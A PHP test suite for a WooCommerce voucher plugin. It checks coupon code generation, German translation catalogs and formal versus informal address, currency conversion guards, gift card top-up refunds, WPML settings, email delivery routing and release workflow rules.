check( 'H8: an unknown column name is an error', '' !== VCAP\Admin\Import::resolve_column( array( array( 'Name' ) ), 'Gutscheincode', true )['error'] );
$b4_report = VCAP\Admin\Import::empty_report( 'b' );
for ( $i = 0; $i < 250; $i++ ) {
	VCAP\Jobs::add_error( $b4_report, 'invalid', "Row {$i}" );
}
check( 'B4: an import error list keeps at most 100 rows and counts all of them', VCAP\Jobs::MAX_ERRORS === count( $b4_report['invalid'] ) && 250 === VCAP\Jobs::count( $b4_report, 'invalid' ) && 'Row 99' === end( $b4_report['invalid'] ) );
check( 'B4: a report stored before the cap is counted by its list', 3 === VCAP\Jobs::count( array( 'weak' => array( 'a', 'b', 'c' ) ), 'weak' ) && 0 === VCAP\Jobs::count( array(), 'not_saved' ) );
check( 'B4: progress of a background job in percent', 40 === VCAP\Jobs::percent( array( 'done' => 100, 'total' => 250 ) ) && 100 === VCAP\Jobs::percent( array( 'done' => 260, 'total' => 250 ) ) && 0 === VCAP\Jobs::percent( array( 'done' => 0, 'total' => 0 ) ) );
check( 'Q2: prefix/suffix/separator only take letters, digits, dot, hyphen, underscore', VCAP\CodeGenerator::valid_affix( 'SHOP_2026.X-' ) && ! VCAP\CodeGenerator::valid_affix( 'B&B' ) && ! VCAP\CodeGenerator::valid_affix( 'Ä' ) && ! VCAP\CodeGenerator::valid_affix( str_repeat( 'A', 21 ) ) && ! VCAP\CodeGenerator::valid_affix( '----', true ) && VCAP\CodeGenerator::valid_affix( '', true ) );
$built = VCAP\CodeGenerator::build( array( 'prefix' => 'B&B Hotel', 'suffix' => str_repeat( 'Z', 40 ), 'order_ref' => str_repeat( '9', 40 ), 'length' => 40, 'separator' => ' & ' ) );
check( 'Q2: generated codes never contain characters WooCommerce changes and stay within 100 characters', strlen( $built ) <= 100 && wc_format_coupon_code( $built ) === strtolower( $built ) && str_starts_with( $built, 'BBHotel' ), $built );

echo "Translations\n";
/** @return array<string, array{0: string[], 1: ?string, 2: bool}> key (context \x04 msgid) => [msgstr forms, msgid_plural, fuzzy] */
function vcap_test_po( string $file ): array {
	$entries = array();
	foreach ( preg_split( "/\n\s*\n/", (string) file_get_contents( $file ) ) as $block ) {
		$lines = array();
		$key   = null;
		foreach ( explode( "\n", $block ) as $line ) {
			if ( preg_match( '/^(msgctxt|msgid|msgid_plural|msgstr(?:\[\d+\])?) "(.*)"$/', $line, $m ) ) {
				$key           = $m[1];
				$lines[ $key ] = stripcslashes( $m[2] );
			} elseif ( null !== $key && preg_match( '/^"(.*)"$/', $line, $m ) ) {
				$lines[ $key ] .= stripcslashes( $m[1] );
			}
		}
		if ( ! isset( $lines['msgid'] ) || '' === $lines['msgid'] ) {
			continue;
		}
		$forms = array();
		foreach ( $lines as $k => $v ) {
			if ( str_starts_with( $k, 'msgstr' ) ) {
				$forms[] = $v;
			}
		}
		$entries[ ( $lines['msgctxt'] ?? '' ) . "\x04" . $lines['msgid'] ] = array( $forms, $lines['msgid_plural'] ?? null, str_contains( $block, '#, fuzzy' ) );
	}
	return $entries;
}
$placeholders = static function ( string $text ): array {
	preg_match_all( '/%(?:\d+\$)?[sdf]|\{[a-z_]+\}/', $text, $m );
	$list = array_map( static fn( $p ) => preg_replace( '/%\d+\$/', '%', $p ), $m[0] );
	sort( $list );
	return $list;
};
$pot = vcap_test_po( dirname( __DIR__ ) . '/languages/voucher-captain.pot' );
check( 'the POT file lists the plugin texts', count( $pot ) > 1000, (string) count( $pot ) );
foreach ( array( 'de_DE', 'de_DE_formal', 'de_AT' ) as $locale ) {
	$po        = vcap_test_po( dirname( __DIR__ ) . "/languages/voucher-captain-{$locale}.po" );
	$missing   = array();
	$broken    = array();
	foreach ( $pot as $key => $entry ) {
		$translation = $po[ $key ] ?? null;
		if ( ! $translation || $translation[2] || in_array( '', $translation[0], true ) || ! $translation[0] ) {
			$missing[] = substr( $key, strpos( $key, "\x04" ) + 1 );
			continue;
		}
		$source = substr( $key, strpos( $key, "\x04" ) + 1 );
		$want   = array_values( array_unique( array_merge( $placeholders( $source ), $placeholders( (string) $entry[1] ) ) ) );
		foreach ( $translation[0] as $form ) {
			$got = array_values( array_unique( $placeholders( $form ) ) );
			// Plural forms may leave out the number (e.g. "one voucher"), never add a placeholder.
			if ( $entry[1] ? array_diff( $got, $want ) : $got !== $want ) {
				$broken[] = $source;
			}
		}
	}
	$obsolete = array_diff_key( $po, $pot );
	check( "{$locale}: every text is translated (none missing or fuzzy)", ! $missing, implode( ' | ', array_slice( $missing, 0, 5 ) ) );
	check( "{$locale}: translations keep the placeholders (%s, %1\$s, {code}) of the source", ! $broken, implode( ' | ', array_slice( array_unique( $broken ), 0, 5 ) ) );
	check( "{$locale}: no translations for texts the plugin no longer uses", ! $obsolete, implode( ' | ', array_slice( array_keys( $obsolete ), 0, 5 ) ) );
	$mo = dirname( __DIR__ ) . "/languages/voucher-captain-{$locale}.mo";
	check( "{$locale}: the compiled .mo file is there", is_file( $mo ) && filesize( $mo ) > 1000 );
	// U11: glossary – store credit "Kundenguthaben", a voucher's balance "Restwert", coupon "WooCommerce-Code",
	// reward "Prämie", buyer "Käufer"; bare "Guthaben" is neither and not used.
	$u11_off    = array();
	$u11_credit = array();
	foreach ( $po as $key => $translation ) {
		$source = substr( $key, strpos( $key, "\x04" ) + 1 );
		foreach ( $translation[0] as $form ) {
			if ( preg_match( '/(?<![Kk]unden)(?<![Kk]unden-)[Gg]uthaben|WooCommerce-Gutschein|WooCommerce-Coupon|Person, die gekauft hat|kaufenden? Person|[Bb]elohnung|gespeichert\w* Guthaben/u', $form, $u11_m ) ) {
				$u11_off[] = $u11_m[0] . ': ' . $source;
			}
			if ( preg_match( '/store credit/i', $source ) && ! str_contains( $form, 'Kundenguthaben' ) ) {
				$u11_credit[] = $source;
			}
		}
	}
	check( "PV-P5-9 / U11: {$locale} uses the glossary (no bare \"Guthaben\", \"WooCommerce-Gutschein\", \"WooCommerce-Coupon\", \"Person, die gekauft hat\", \"kaufende Person\", \"Belohnung\")", ! $u11_off, implode( ' | ', array_slice( $u11_off, 0, 5 ) ) );
	check( "U11: {$locale} translates every \"store credit\" as \"Kundenguthaben\"", ! $u11_credit, implode( ' | ', array_slice( array_unique( $u11_credit ), 0, 5 ) ) );
}

// S4 (owner decision 23.11.2026): de_DE addresses with "du", de_DE_formal and de_AT with "Sie"; no mix in one file. A
// text without an address is the same in de_DE and de_DE_formal. ("Sie" as 3rd person plural, e.g. "Sie laufen nicht
// ab" = the vouchers, stays allowed: only the unambiguous formal forms are refused in de_DE.)
$s4_informal = '/\b([Dd]u|[Dd]ir|[Dd]ich|[Dd]ein(e|er|en|em|es)?|[Ee]uch|[Ee]uer|[Ee]ure[rnms]?)\b/u';
$s4_formal   = '/\b[a-zäöüß]+en Sie\b|\bIhnen\b/u';
$s4_du       = vcap_test_po( dirname( __DIR__ ) . '/languages/voucher-captain-de_DE.po' );
$s4_sie      = vcap_test_po( dirname( __DIR__ ) . '/languages/voucher-captain-de_DE_formal.po' );
$s4_at       = vcap_test_po( dirname( __DIR__ ) . '/languages/voucher-captain-de_AT.po' );
$s4_bad      = array();
$s4_address  = 0;
// PV-P5-1: the formal possessive "Ihr/Ihre…" for "your" in de_DE (3rd-person "Ihre" = "its/their" stays allowed).
$s4_possessive = '/\b(Ihr|Ihre[mnrs]?)\b/u';
$s4_poss       = array();
foreach ( $s4_du as $key => $entry ) {
	foreach ( $entry[0] as $i => $du ) {
		$sie = (string) ( $s4_sie[ $key ][0][ $i ] ?? '' );
		if ( preg_match( $s4_formal, $du ) ) {
			$s4_bad[] = 'de_DE uses "Sie": ' . $du;
		}
		if ( preg_match( $s4_possessive, $du ) && false !== stripos( explode( "\x04", (string) $key )[1] . ' ' . (string) $entry[1], 'your' ) ) {
			$s4_poss[] = $du;
		}
		if ( preg_match( $s4_informal, $sie ) ) {
			$s4_bad[] = 'de_DE_formal uses "du": ' . $sie;
		}
		foreach ( (array) ( $s4_at[ $key ][0] ?? array() ) as $at ) {
			if ( preg_match( $s4_informal, (string) $at ) ) {
				$s4_bad[] = 'de_AT uses "du": ' . $at;
			}
		}
		if ( preg_match( $s4_informal, $du ) ) {
			++$s4_address;
			if ( $du === $sie ) {
				$s4_bad[] = 'a text that says "du" needs its own formal text: ' . $du;
			}
		}
	}
}
check( 'PV-P5-1: de_DE says "dein/deine" for "your" – no formal "Ihr/Ihre" possessive (3rd-person "Ihre" stays allowed)', array() === $s4_poss, implode( ' | ', array_slice( $s4_poss, 0, 5 ) ) );
check( 'PV-P5-1: the possessive check sees "Ihr/Ihre" and leaves other words alone', 1 === preg_match( $s4_possessive, 'Ihre Gutscheine' ) && 1 === preg_match( $s4_possessive, 'an Ihrem Konto' ) && 0 === preg_match( $s4_possessive, 'Ihrerseits' ) && 0 === preg_match( $s4_possessive, 'Dein Gutschein' ) );
check( 'S4: de_DE says "du", de_DE_formal and de_AT say "Sie" – no mix in one file, both German catalogs hold the same texts', array() === $s4_bad && array_keys( $s4_du ) === array_keys( $s4_sie ) && $s4_address > 100, implode( ' | ', array_slice( $s4_bad, 0, 5 ) ) . ' (addressed: ' . $s4_address . ')' );

// Locale fallback (VCAP\I18n): German variants without their own file load the German translation.
$lang = dirname( __DIR__ ) . '/languages/';
$wp_lang = $out . '/wp-languages/plugins/';
@mkdir( $wp_lang, 0777, true );
check( 'S4: de_DE (du) and de_DE_formal (Sie) are both shipped and keep their own files', $lang . 'voucher-captain-de_DE_formal.mo' === \VCAP\I18n::mofile( $lang . 'voucher-captain-de_DE_formal.mo', 'voucher-captain' ) && $lang . 'voucher-captain-de_DE.mo' === \VCAP\I18n::mofile( $lang . 'voucher-captain-de_DE.mo', 'voucher-captain' ) );
check( 'S4: de_CH loads the formal translation (Sie), de_CH_informal the informal one (du)', $lang . 'voucher-captain-de_DE_formal.mo' === \VCAP\I18n::mofile( $lang . 'voucher-captain-de_CH.mo', 'voucher-captain' ) && $lang . 'voucher-captain-de_DE.mo' === \VCAP\I18n::mofile( $lang . 'voucher-captain-de_CH_informal.mo', 'voucher-captain' ) );
check( 'a locale with its own file keeps it (de_AT)', $lang . 'voucher-captain-de_AT.mo' === \VCAP\I18n::mofile( $lang . 'voucher-captain-de_AT.mo', 'voucher-captain' ) );
check( 'the global languages folder falls back to the plugin file of the same locale first (de_AT, de_DE_formal), then along the chain (de_CH → de_DE_formal)', $lang . 'voucher-captain-de_AT.mo' === \VCAP\I18n::mofile( $wp_lang . 'voucher-captain-de_AT.mo', 'voucher-captain' ) && $lang . 'voucher-captain-de_DE_formal.mo' === \VCAP\I18n::mofile( $wp_lang . 'voucher-captain-de_DE_formal.mo', 'voucher-captain' ) && $lang . 'voucher-captain-de_DE_formal.mo' === \VCAP\I18n::mofile( $wp_lang . 'voucher-captain-de_CH.mo', 'voucher-captain' ) );
check( 'other locales and other text domains are left alone', $lang . 'voucher-captain-fr_FR.mo' === \VCAP\I18n::mofile( $lang . 'voucher-captain-fr_FR.mo', 'voucher-captain' ) && $wp_lang . 'woocommerce-de_DE_formal.mo' === \VCAP\I18n::mofile( $wp_lang . 'woocommerce-de_DE_formal.mo', 'woocommerce' ) );
check( 'just-in-time loading finds the plugin folder for de_DE_formal', $lang === \VCAP\I18n::lang_dir( false, 'voucher-captain', 'de_DE_formal' ) && false === \VCAP\I18n::lang_dir( false, 'voucher-captain', 'fr_FR' ) );
// bin/make-pot.php: version from the plugin header, header fields translatable (like wp i18n make-pot).
$pot_file = $out . '/make-pot-test.pot';
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( dirname( __DIR__ ) . '/bin/make-pot.php' ) . ' ' . escapeshellarg( $pot_file ), $pot_log, $pot_status );
$pot_new = 0 === $pot_status ? vcap_test_po( $pot_file ) : array();
preg_match( '/^ \* Version:\s*(\S+)/m', (string) file_get_contents( dirname( __DIR__ ) . '/voucher-captain.php' ), $vcap_version );
preg_match( '/^ \* Description:\s*(.+)$/m', (string) file_get_contents( dirname( __DIR__ ) . '/voucher-captain.php' ), $vcap_description );
check( 'make-pot: the POT names the plugin version of the header', str_contains( (string) @file_get_contents( $pot_file ), 'Project-Id-Version: Voucher Captain ' . ( $vcap_version[1] ?? '?' ) . '\\n' ), implode( ' ', $pot_log ) );
check( 'make-pot: plugin name and description are translatable', isset( $pot_new[ "\x04Voucher Captain" ], $pot_new[ "\x04" . trim( $vcap_description[1] ?? '?' ) ] ) );
@unlink( $pot_file );

echo "Money guards: currencies, gift card shares, discount setup\n";
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'EUR';
$fx_filters = $GLOBALS['vcap_test_filters']['vcap_amount_to_base_currency'] ?? null;
$fx_known   = $GLOBALS['vcap_test_filters']['vcap_currency_rate_known'] ?? null;
( new VCAP\Compat\MultiCurrency() )->register();
check( 'the base currency always converts (unchanged)', VCAP\Compat\MultiCurrency::can_convert( 'EUR' ) && 12.5 === VCAP\Compat\MultiCurrency::to_base( 12.5, 'EUR' ) );
check( 'a foreign currency without converter is never taken 1:1', ! VCAP\Compat\MultiCurrency::can_convert( 'CZK' ) && null === VCAP\Compat\MultiCurrency::to_base( 1000.0, 'CZK' ) );
check( 'the refusal is recorded for Site Health', isset( VCAP\Compat\MultiCurrency::unknown_currencies()['CZK'] ) );
check( 'the public filter still returns the amount unchanged without a rate (extension contract)', 1000.0 === (float) apply_filters( 'vcap_amount_to_base_currency', 1000.0, 'CZK', null ) );
add_filter( 'vcap_amount_to_base_currency', static fn( $amount, $currency ) => 'CZK' === $currency ? $amount / 25 : $amount, 20, 2 );
check( 'a converter on the public filter counts as a known rate (1000 CZK = 40 EUR)', VCAP\Compat\MultiCurrency::can_convert( 'CZK' ) && 40.0 === VCAP\Compat\MultiCurrency::to_base( 1000.0, 'CZK' ) );
check( 'other currencies stay unknown', ! VCAP\Compat\MultiCurrency::can_convert( 'HUF' ) );
add_filter( 'vcap_currency_rate_known', static fn( $known, $currency ) => $known || 'DKK' === $currency, 10, 2 );
check( 'vcap_currency_rate_known declares a 1:1 peg as known', VCAP\Compat\MultiCurrency::can_convert( 'DKK' ) && 10.0 === VCAP\Compat\MultiCurrency::to_base( 10.0, 'DKK' ) );
// A switcher without a rate list (Aelia, WCML) returns amounts of a currency it does not know unchanged: that
// currency has no rate (an order in it, e.g. created by hand, must not be taken 1:1), the configured one has.
$GLOBALS['vcap_test_filters']['wc_aelia_cs_convert'] = array( array( static fn( $amount, $from ) => 'USD' === $from ? $amount / 2 : $amount, 3 ) );
check( 'Aelia: a configured currency converts (50 USD = 25 EUR)', VCAP\Compat\MultiCurrency::can_convert( 'USD' ) && 25.0 === VCAP\Compat\MultiCurrency::to_base( 50.0, 'USD' ) );
check( 'Aelia: a currency it returns unchanged is not converted 1:1', ! VCAP\Compat\MultiCurrency::can_convert( 'PLN' ) && null === VCAP\Compat\MultiCurrency::to_base( 100.0, 'PLN' ) );
unset( $GLOBALS['vcap_test_filters']['wc_aelia_cs_convert'] );
$GLOBALS['vcap_test_filters']['vcap_amount_to_base_currency'] = $fx_filters;
$GLOBALS['vcap_test_filters']['vcap_currency_rate_known']     = $fx_known;
if ( null === $fx_filters ) {
	unset( $GLOBALS['vcap_test_filters']['vcap_amount_to_base_currency'] );
}
if ( null === $fx_known ) {
	unset( $GLOBALS['vcap_test_filters']['vcap_currency_rate_known'] );
}
unset( $GLOBALS['vcap_test_options'][ VCAP\Compat\MultiCurrency::UNKNOWN_OPTION ] );

$sh = VCAP\TopUp::shares( 100, 0, 100, 100 );
check( 'card 100 + top-up 100, 100 spent: the purchase counts as spent, the top-up as unspent', 100.0 === $sh['purchase_spent'] && 0.0 === $sh['purchase_unspent'] && 100.0 === $sh['topup_unspent'], wp_json_encode( $sh ) );
$sh = VCAP\TopUp::shares( 100, 0, 100, 150 );
check( 'card 100 + top-up 100, 50 spent: 50 of the purchase and the whole top-up can be refunded (= balance 150)', 50.0 === $sh['purchase_spent'] && 50.0 === $sh['purchase_unspent'] && 100.0 === $sh['topup_unspent'], wp_json_encode( $sh ) );
$sh = VCAP\TopUp::shares( 100, 0, 0, 50 );
check( 'after the top-up (100) was refunded first, the purchase counts 50 as spent', 50.0 === $sh['purchase_spent'] && 50.0 === $sh['purchase_unspent'], wp_json_encode( $sh ) );
$sh = VCAP\TopUp::shares( 100, 50, 100, 100 );
check( 'after the unspent purchased value (50) was taken off, the purchase has nothing left and the top-up keeps 100', 50.0 === $sh['purchase_spent'] && 0.0 === $sh['purchase_unspent'] && 100.0 === $sh['topup_unspent'], wp_json_encode( $sh ) );
$sh = VCAP\TopUp::shares( 100, 0, 100, 100, true );
check( 'a voided card: top-ups only claim the balance above the purchased value still on the books', 0.0 === $sh['topup_unspent'], wp_json_encode( $sh ) );
$sh = VCAP\TopUp::shares( 20, 0, 0, 60 );
check( 'goodwill above purchase and top-ups is not refundable', 0.0 === $sh['purchase_spent'] && 20.0 === $sh['purchase_unspent'] && 0.0 === $sh['topup_unspent'], wp_json_encode( $sh ) );
$over = array();
mt_srand( 42 );
for ( $i = 0; $i < 2000; $i++ ) {
	$initial = mt_rand( 0, 300 );
	$topups  = mt_rand( 0, 300 );
	$removed = mt_rand( 0, $initial );
	$balance = mt_rand( 0, max( 0, $initial - $removed + $topups ) );
	foreach ( array( false, true ) as $void ) {
		$sh = VCAP\TopUp::shares( $initial, $removed, $topups, $balance, $void );
		if ( $sh['purchase_unspent'] + $sh['topup_unspent'] > $balance + 1e-9 || $sh['purchase_spent'] + $sh['purchase_unspent'] > $initial - $removed + 1e-9 ) {
			$over[] = array( $initial, $removed, $topups, $balance, $void );
		}
	}
}
check( 'purchase refund + top-up refunds never exceed the balance (2000 random cards, active and voided)', ! $over, wp_json_encode( array_slice( $over, 0, 3 ) ) );

$cfg = static fn( array $c ) => $c + ProductConfig::DEFAULTS;
check( 'percentage from the product price is refused', (bool) ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'percent', 'amount_source' => 'price' ) ) ) );
check( 'percentage from a customer-chosen amount is refused', (bool) ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'percent', 'amount_source' => 'custom' ) ) ) );
check( 'percentage above 100 or of 0 is refused', ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'percent', 'amount_source' => 'fixed', 'amount' => '120' ) ) ) && ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'percent', 'amount_source' => 'fixed', 'amount' => '' ) ) ) );
check( 'a fixed percentage between 0 and 100 is fine', array() === ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'percent', 'amount_source' => 'fixed', 'amount' => '100' ) ) ) && array() === ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'percent', 'amount_source' => 'fixed', 'amount' => '12,5' ) ) ) );
check( '"Fixed product discount" is refused for sold single-use vouchers, not for stored balances (cart discount)', ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'fixed_product' ) ) ) && array() === ProductConfig::discount_errors( $cfg( array( 'discount_type' => 'fixed_product', 'usage' => 'balance' ) ) ) );
check( 'a ticket without fixed value carries no value (no coupon) and stays fine', array() === ProductConfig::discount_errors( $cfg( array( 'type' => 'ticket', 'discount_type' => 'percent', 'amount_source' => 'price' ) ) ) );
check( 'the default setup (fixed cart discount from the price) is fine', array() === ProductConfig::discount_errors( ProductConfig::DEFAULTS ) );
echo "Languages and customer mails (multilingual shops, recipients, delivery notes)\n";
$wpml = (string) file_get_contents( dirname( __DIR__ ) . '/wpml-config.xml' );
$product_metas = array_map( array( ProductConfig::class, 'meta_key' ), array_keys( ProductConfig::DEFAULTS ) );
$product_metas = array_merge( $product_metas, array( '_vcap_enabled', VCAP\TopUp::PRODUCT_META ) );
$unlisted      = array_values( array_filter( $product_metas, static fn( $key ) => ! preg_match( '#<custom-field action="(copy|copy-once|translate)">' . preg_quote( $key, '#' ) . '</custom-field>#', $wpml ) ) );
check( 'wpml-config.xml lists every voucher setting of a product (ProductConfig::DEFAULTS, enabled, top-up)', ! $unlisted, implode( ', ', $unlisted ) );
check( 'wpml-config.xml: redemption conditions and event location are translated per language', str_contains( $wpml, '<custom-field action="translate">_vcap_redemption_terms</custom-field>' ) && str_contains( $wpml, '<custom-field action="translate">_vcap_event_location</custom-field>' ) );
$email_ids = array();
foreach ( glob( dirname( __DIR__ ) . '/src/Emails/*.php' ) as $file ) {
	if ( preg_match_all( "/this->id\\s*=\\s*(?:\\\$this->id \\? \\\$this->id : )?'([a-z_]+)'/", (string) file_get_contents( $file ), $m ) ) {
		$email_ids = array_merge( $email_ids, $m[1] );
	}
}
sort( $email_ids );
$known_ids = VCAP\Compat\Multilingual::EMAIL_IDS;
sort( $known_ids );
check( 'every customer email of the plugin is in the list of translatable email texts', $email_ids === $known_ids, implode( ',', $email_ids ) );
$admin_texts = true;
foreach ( VCAP\Compat\Multilingual::OPTIONS as $option ) {
	// SET-VC-04: the conditions per country are a table – WPML translates the text of each row.
	$admin_texts = $admin_texts && ( str_contains( $wpml, '<key name="' . $option . '" />' ) || (bool) preg_match( '#<key name="' . $option . '">\s*<key name="\*">\s*<key name="text" />#', $wpml ) );
}
foreach ( VCAP\Compat\Multilingual::EMAIL_IDS as $id ) {
	$block       = preg_match( '#<key name="woocommerce_' . $id . '_settings">(.*?)</key>\s*(?=<key name="woocommerce_|</admin-texts>)#s', $wpml, $m ) ? $m[1] : '';
	foreach ( VCAP\Compat\Multilingual::EMAIL_KEYS as $key ) {
		$admin_texts = $admin_texts && str_contains( $block, '<key name="' . $key . '" />' );
	}
}
check( 'wpml-config.xml registers the redemption conditions and the email texts for string translation', $admin_texts );

check( 'the email locale falls back to the site language', 'de_DE' === VCAP\Compat\Multilingual::email_locale( null ) );
add_filter( 'vcap_order_language', static fn( $lang ) => 'en' );
add_filter( 'vcap_email_locale', static fn( $locale ) => 'en_GB', 10, 1 );
check( 'filter "vcap_email_locale" chooses the locale of a customer mail', 'en_GB' === VCAP\Compat\Multilingual::email_locale( null ) && 'en' === VCAP\Compat\Multilingual::order_language( null ) );
unset( $GLOBALS['vcap_test_filters']['vcap_email_locale'], $GLOBALS['vcap_test_filters']['vcap_order_language'] );
$state = VCAP\Compat\Multilingual::switch_to( '', 'fr' );
$inner = VCAP\Compat\Multilingual::mail_language();
VCAP\Compat\Multilingual::restore( $state );
check( 'the language of a mail is known while it is prepared and forgotten afterwards', 'fr' === $inner && '' === VCAP\Compat\Multilingual::mail_language() && $state['ready'] );

$intro = static fn() => __( 'Hi {buyer_name}, thank you for your order #{order_number}. Your voucher for {product_name} is ready.', 'voucher-captain' );
check( 'the translation files are read for the default texts', count( VCAP\I18n::read_mo( dirname( __DIR__ ) . '/languages/voucher-captain-de_DE.mo' ) ) > 1000 );
check( 'a saved default email body is recognised in English and in German', VCAP\I18n::is_default_text( ' Hi {buyer_name}, thank you for your order #{order_number}. Your voucher for {product_name} is ready.', $intro ) && VCAP\I18n::is_default_text( 'Hallo {buyer_name}, vielen Dank für Ihre Bestellung #{order_number}. Ihr Gutschein für {product_name} ist bereit.', $intro ) && VCAP\I18n::is_default_text( '', $intro ) );
check( 'an email body of the shop is kept', ! VCAP\I18n::is_default_text( 'Danke für Ihren Einkauf, {buyer_name}!', $intro ) );

check( 'stored UTC dates are shown in the shop time zone with wp_date()', '24.12.2026 09:00' === VCAP\LocalDate::from_utc( '2026-12-24 08:00:00', 'd.m.Y H:i' ) && '' === VCAP\LocalDate::from_utc( '', 'd.m.Y' ) && '' === VCAP\LocalDate::from_utc( null, 'd.m.Y' ) );
check( 'percentages use the decimal separator of the shop', '12,5%' === VCAP\Format::percent( '12.5' ) && '15%' === VCAP\Format::percent( 15 ) );

$gift                  = clone $v;
$gift->recipient_name  = '';
$gift->buyer_name      = 'Max Käufer';
$names                 = Placeholders::values( $gift );
check( '{recipient_name} is empty without a recipient name, {holder_name} names the buyer', '' === $names['recipient_name'] && 'Max Käufer' === $names['holder_name'] && 'Max Käufer' === $names['buyer_name'] );
check( 'a text whose placeholders are all empty is recognised, other texts are not', Placeholders::all_empty( 'For: {recipient_name}', $gift ) && ! Placeholders::all_empty( 'For: {recipient_name} {buyer_name}', $gift ) && ! Placeholders::all_empty( 'GIFT VOUCHER', $gift ) );
$pdf_gift = vcap()->pdf->html( $gift, TemplatePostType::default_designs()['giftcard'] );
$pdf_named = vcap()->pdf->html( $v, TemplatePostType::default_designs()['giftcard'] );
check( 'the PDF leaves out "For:" without a recipient name and never names the buyer there', ! str_contains( $pdf_gift, 'For:' ) && ! str_contains( $pdf_gift, 'Max Käufer' ) && str_contains( $pdf_named, 'For: Jörg Empfänger' ) );
check( 'the ticket names its holder (recipient, else buyer)', str_contains( vcap()->pdf->html( $gift, TemplatePostType::default_designs()['ticket'] ), 'Guest: Max Käufer' ) );

$routed                  = new Voucher();
$routed->send_to         = 'recipient';
$routed->buyer_email     = 'Anna@Example.com';
$routed->recipient_email = ' anna@example.com';
check( 'a gift to the buyer\'s own address goes only to the buyer', ! Delivery::to_recipient( $routed ) && Delivery::same_address( 'Anna@Example.com ', 'anna@example.com' ) );
$delivery = ( new ReflectionClass( Delivery::class ) )->newInstanceWithoutConstructor();
check( '… and the buyer is the one who must receive it', array( 'buyer' ) === $delivery->required_roles( $routed ) );
$routed->recipient_email = 'ben@example.com';
check( 'a gift to another address goes to the recipient', Delivery::to_recipient( $routed ) && array( 'recipient' ) === $delivery->required_roles( $routed ) );
check( 'additional recipients: valid, without the main address and duplicates, each separately', array( 'archive@shop.test', 'Office@shop.test' ) === Delivery::extra_addresses( 'archive@shop.test, nonsense, BEN@example.com, Office@shop.test, office@shop.test', 'ben@example.com' ) );

check( 'line breaks of a message count as one character (CRLF → LF)', "Hallo\nWelt\nzwei" === VCAP\Fields::normalize_newlines( "Hallo\r\nWelt\rzwei" ) && 300 === mb_strlen( VCAP\Fields::normalize_newlines( str_repeat( "ab\r\n", 100 ) ) ) );

$cfg = array( 'send_to' => 'recipient' ) + ProductConfig::DEFAULTS;
check( 'the buyer learns where and when a gift goes', 'The voucher will be emailed to ben@example.com on 24.12.2026.' === VCAP\NextSteps::summary( $cfg, array( 'recipient_email' => array( 'value' => 'ben@example.com' ) ), 'anna@example.com', '2026-12-24 08:00:00' ) );
check( '… right after payment, to the buyer when no other recipient is entered', 'The voucher will be emailed to you right after payment.' === VCAP\NextSteps::summary( $cfg, array( 'recipient_email' => array( 'value' => 'anna@example.com' ) ), 'anna@example.com', null ) && 'The voucher will be emailed to ben@example.com right after payment.' === VCAP\NextSteps::summary( $cfg, array( 'recipient_email' => array( 'value' => 'ben@example.com' ) ), '', null ) );
check( 'the product page names a delivery delay', 'The voucher is sent by email 3 days after the purchase.' === VCAP\NextSteps::product_hint( array( 'delivery' => 'delay', 'delivery_delay_days' => 3 ) + ProductConfig::DEFAULTS ) && '' === VCAP\NextSteps::product_hint( ProductConfig::DEFAULTS ) );

// Translator comments belong to the string with the placeholders (make-pot attaches a comment to the next string).
$pot_file = $out . '/check.pot';
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( dirname( __DIR__ ) . '/bin/make-pot.php' ) . ' ' . escapeshellarg( $pot_file ), $ignored, $pot_status );
$uncommented = array();
$misplaced   = array();
foreach ( preg_split( "/\n\s*\n/", (string) @file_get_contents( $pot_file ) ) as $block ) {
	if ( ! preg_match( '/^msgid "(.+)"$/m', $block, $m ) ) {
		continue;
	}
	$has_placeholder = (bool) preg_match( '/%(\d+\$)?[sdf]/', $m[1] );
	$has_comment     = (bool) preg_match( '/^#\. translators:/mi', $block );
	if ( $has_placeholder && ! $has_comment ) {
		$uncommented[] = $m[1];
	} elseif ( ! $has_placeholder && $has_comment ) {
		$misplaced[] = $m[1];
	}
}
check( 'every text with placeholders has a translators comment, and no comment sits on a text without one', 0 === $pot_status && ! $uncommented && ! $misplaced, implode( ' | ', array_slice( array_merge( $uncommented, $misplaced ), 0, 5 ) ) );
echo "Release tooling (workflows, SBOM, bundled libraries)\n";
$root     = dirname( __DIR__ );
$smoke_yml = (string) file_get_contents( "$root/.github/workflows/plugin-smoke.yml" );
$release_yml = (string) file_get_contents( "$root/.github/workflows/release.yml" );
check( 'release.yml builds one ZIP (no editions, no licence server tooling or manifest)', str_contains( $release_yml, 'bin/build.sh' ) && ! preg_match( '/VCAP_EDITION|VCAP_LICENSE_|wp-license|wplc|premium/', $release_yml . $smoke_yml ) );
check( 'release.yml refuses a tag that is not on main', str_contains( $release_yml, 'merge-base --is-ancestor "$SHA" origin/main' ) );
check( 'ci-green checks every job of the CI run, not only the run conclusion', str_contains( $release_yml, 'actions/runs/${id}/jobs' ) && str_contains( $release_yml, 'REPORT_ONLY:' ) );
check( 'only the Pass Captain work branch may be skipped; the pinned release and main must be downloaded', (bool) preg_match( '/pass_captain_ref: v\d+\.\d+\.\d+\s*\n\s*archive: [0-9a-f]{40}\s*\n\s*required: true/', $smoke_yml ) && (bool) preg_match( '/pass_captain_ref: main\s*\n\s*archive: refs\/heads\/main\s*\n\s*required: true/', $smoke_yml ) && str_contains( $smoke_yml, 'if [ "${{ matrix.required }}" = "true" ]; then' ) );
check( 'quality-wide blocks on WordPress.Security findings and on growing findings (no continue-on-error)', (bool) preg_match( '/\n  quality-wide:\n(?:(?!\n  [a-z-]+:\n).)*WordPress\.Security\.EscapeOutput(?:(?!\n  [a-z-]+:\n).)*Findings must not grow/s', $smoke_yml ) && ! preg_match( '/\n  quality-wide:\n(?:(?!\n  [a-z-]+:\n).)*continue-on-error/s', $smoke_yml ) );
preg_match( '/\n  ecosystem:\n(.*?)\n  [a-z-]+:\n/s', $smoke_yml, $r15 );
